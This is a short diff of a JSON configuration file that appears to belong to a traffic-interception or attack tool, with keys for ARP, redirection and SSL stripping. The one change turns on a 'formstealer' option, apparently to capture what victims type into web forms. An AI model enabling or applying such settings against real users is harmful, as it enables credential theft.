@@ -14,7 +14,7 @@
       "arp":"0",
       "redirectto":"0",
       "redirectown":"0",
-      "formstealer":"0",
+      "formstealer":"1",
       "sslstrip":"0"
       }
 }
